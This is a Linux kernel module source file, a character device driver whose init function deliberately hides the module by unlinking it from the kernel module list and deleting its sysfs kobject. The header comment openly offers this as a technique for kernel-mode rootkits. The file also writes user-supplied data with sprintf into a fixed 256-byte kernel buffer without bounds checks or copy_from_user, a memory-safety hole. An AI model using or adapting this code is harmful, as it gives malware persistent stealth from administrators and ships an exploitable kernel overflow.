/*
This C program is a simple character driver that implements DKOM to hide itself. Lines 45-46 are specifically where the obfuscation occurs.
This technique can be useful for kernel mode rootkits and other code obfuscation/kernel structure manipulation. Use wisely. Tested Nov. 15, 2023 on Ubuntu 22.04 LTS.
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define DEVICE_NAME "VISIBLEPROC"
#define CLASS_NAME "VISIBLE"

// Prototypes

static int      dev_open(struct inode *inode, struct file *f);
static int      dev_release(struct inode *inode, struct file *f);
static ssize_t  dev_read(struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t  dev_write(struct file *f, const char __user *buf, size_t len, loff_t *off);

// Module Info

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Linus");
MODULE_DESCRIPTION("Character Device Driver.");
MODULE_VERSION("0.1");

static int              majorNumber;
static char             message[256]={0};
static short            size_of_message;
static int              numberOpens = 0;
static struct class*    ebbcharClass = NULL;
static struct device*   ebbcharDevice = NULL;

static struct file_operations fops = {
    .open = dev_open,
    .read = dev_read,
    .write = dev_write,
    .release = dev_release,
};

static int __init ebbchar_init(void) {
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
    printk(KERN_INFO "Initializing VISIBLEPROC LKM\n");
    // Create Char Device
    if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
        printk(KERN_ALERT "VISIBLEPROC failed to register a major number\n");
        return majorNumber;
    }
    printk(KERN_INFO "VISIBLEPROC: major number %d\n", majorNumber);

    // Register the device class
    ebbcharClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(ebbcharClass)) {
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(ebbcharClass);
    }

    printk(KERN_INFO "device class registered correctly\n");

    // Register the device driver
    ebbcharDevice = device_create(ebbcharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
    if (IS_ERR(ebbcharDevice)) {
        class_destroy(ebbcharClass);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(ebbcharDevice);
    }
    printk(KERN_ALERT "VISIBLEPROC to create the device driver\n");
    return 0;
}

static void __exit ebbchar_exit(void) {
    // Destroy the device
    device_destroy(ebbcharClass, MKDEV(majorNumber, 0));
    class_unregister(ebbcharClass);
    class_destroy(ebbcharClass);
    unregister_chrdev(majorNumber, DEVICE_NAME);
    printk(KERN_INFO "Bye VISIBLEPROC\n"); 
}

static int dev_open(struct inode *inode, struct file *f) {
    numberOpens++;
    printk(KERN_INFO "Device was open\n");
    return 0;
}

static ssize_t dev_read(struct file *f, char *buf, size_t len, loff_t *off) {
    int error_count = 0;
    // copy to user has the format ( * to, * from, size) and returns 0 on success
    error_count = copy_to_user(buf, message, size_of_message);

    if (error_count == 0) {
        printk(KERN_INFO "VISIBLEPROC: Sent %d characters to the user\n", size_of_message);
        return (size_of_message = 0);
    }
    else {
        printk(KERN_INFO "VISIBLEPROC: Failed to send %d characters to the user\n", error_count);
        return -EFAULT;
    }
}

static ssize_t dev_write(struct file *f, const char *buf, size_t len, loff_t *off) {
    sprintf(message, "%s(%zu letters)", buf, len);
    size_of_message = strlen(message);
    printk(KERN_INFO "VISIBLEPROC received characters\n");
    return len;
}

static int dev_release(struct inode *inode, struct file *f) {
    printk(KERN_INFO "Device Closed");
    return 0;
}

module_init(ebbchar_init);
module_exit(ebbchar_exit);
